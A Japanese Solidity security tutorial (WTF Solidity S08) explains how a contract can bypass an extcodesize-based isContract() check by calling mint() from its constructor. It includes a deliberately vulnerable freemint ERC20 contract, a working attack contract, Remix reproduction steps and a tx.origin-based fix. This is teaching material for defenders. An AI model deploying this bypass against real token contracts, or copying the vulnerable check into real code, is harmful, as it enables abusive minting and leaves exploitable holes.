---
title: S08. コントラクトチェックの回避
tags:
  - solidity
  - security
  - constructor
---

# WTF Solidity 合約セキュリティ: S08. コントラクト長チェックの回避

私は最近Solidityを学び直して詳細を固めており、「WTF Solidity 合約セキュリティ」を書いています。初心者向けの内容で（プログラミング上級者は他のチュートリアルをお探しください）、毎週1-3講座を更新しています。

Twitter：[@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

コミュニティ：[Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[公式サイト wtf.academy](https://wtf.academy)

すべてのコードとチュートリアルはgithubでオープンソース化されています：[github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

---

今回は、コントラクト長チェックの回避について紹介し、予防方法を説明します。

## コントラクトチェックの回避

多くのfreemintプロジェクトは、プログラマー（科学者）を制限するために`isContract()`メソッドを使用し、呼び出し元`msg.sender`を外部アカウント（EOA）に制限し、コントラクトではないようにしようとします。この関数は`extcodesize`を利用してそのアドレスに保存されている`bytecode`の長さ（runtime）を取得し、0より大きい場合はコントラクトと判断し、そうでなければEOA（ユーザー）と判断します。

```solidity
// extcodesizeを利用してコントラクトかどうかをチェック
function isContract(address account) public view returns (bool) {
    // extcodesize > 0 のアドレスは必ずコントラクトアドレス
    // ただし、コントラクトのコンストラクタ実行時はextcodesizeが0
    uint size;
    assembly {
        size := extcodesize(account)
    }
    return size > 0;
}
```

ここに脆弱性があります。コントラクトが作成される際、`runtime bytecode`がまだアドレスに保存されていないため、`bytecode`の長さが0になります。つまり、ロジックをコントラクトのコンストラクタ`constructor`内に記述すれば、`isContract()`チェックを回避できます。

![image1](./img/S08-1.png)

## 脆弱性の例

以下の例を見てみましょう：`ContractCheck`コントラクトはfreemint ERC20コントラクトで、ミント関数`mint()`内で`isContract()`関数を使用してコントラクトアドレスの呼び出しを阻止し、プログラマーの一括ミントを防いでいます。`mint()`を呼び出すたびに100枚のトークンをミントできます。

```solidity
// extcodesizeでコントラクトアドレスかどうかをチェック
contract ContractCheck is ERC20 {
    // コンストラクタ：トークン名と記号を初期化
    constructor() ERC20("", "") {}

    // extcodesizeを利用してコントラクトかどうかをチェック
    function isContract(address account) public view returns (bool) {
        // extcodesize > 0 のアドレスは必ずコントラクトアドレス
        // ただし、コントラクトのコンストラクタ実行時はextcodesizeが0
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    // mint関数、非コントラクトアドレスのみ呼び出し可能（脆弱性あり）
    function mint() public {
        require(!isContract(msg.sender), "Contract not allowed!");
        _mint(msg.sender, 100);
    }
}
```

攻撃コントラクトを作成し、`constructor`内で`ContractCheck`コントラクトの`mint()`関数を複数回呼び出し、`1000`枚のトークンを一括ミントします：

```solidity
// コンストラクタの特性を利用した攻撃
contract NotContract {
    bool public isContract;
    address public contractCheck;

    // コントラクト作成中、extcodesize（コード長）は0のため、isContract()で検出されない。
    constructor(address addr) {
        contractCheck = addr;
        isContract = ContractCheck(addr).isContract(address(this));
        // これは動作する
        for(uint i; i < 10; i++){
            ContractCheck(addr).mint();
        }
    }

    // コントラクト作成後、extcodesize > 0となり、isContract()で検出可能
    function mint() external {
        ContractCheck(contractCheck).mint();
    }
}
```

前述の内容が正しければ、コンストラクタ内で`mint()`を呼び出すことで`isContract()`チェックを回避してトークンのミントに成功し、関数は正常にデプロイされ、状態変数`isContract`がコンストラクタ内で`false`に設定されます。コントラクトデプロイ後、`runtime bytecode`が既にコントラクトアドレスに保存され、`extcodesize > 0`となり、`isContract()`がミントを正常に阻止し、`mint()`関数の呼び出しは失敗します。

## `Remix`再現

1. `ContractCheck`コントラクトをデプロイします。

2. `NotContract`コントラクトをデプロイし、パラメータを`ContractCheck`コントラクトアドレスにします。

3. `ContractCheck`コントラクトの`balanceOf`を呼び出して`NotContract`コントラクトのトークン残高を確認すると`1000`になっており、攻撃が成功しています。

4. `NotContract`コントラクトの`mint()`関数を呼び出すと、この時点でコントラクトは既にデプロイ完了しているため、`mint()`関数の呼び出しは失敗します。

## 予防方法

`(tx.origin == msg.sender)`を使用して呼び出し元がコントラクトかどうかを検出できます。呼び出し元がEOAの場合、`tx.origin`と`msg.sender`は等しく、等しくない場合は呼び出し元がコントラクトです。[eip-3074](https://eips.ethereum.org/EIPS/eip-3074)では、このようなコントラクトチェック方法は無効になります。

```solidity
function realContract(address account) public view returns (bool) {
    return (tx.origin == msg.sender);
}
```

## まとめ

今回は、コントラクト長チェックを回避できる脆弱性について紹介し、予防方法を説明しました。あるアドレスの`extcodesize > 0`の場合、そのアドレスは必ずコントラクトですが、`extcodesize = 0`の場合、そのアドレスは`EOA`の可能性もあれば、作成中状態のコントラクトの可能性もあります。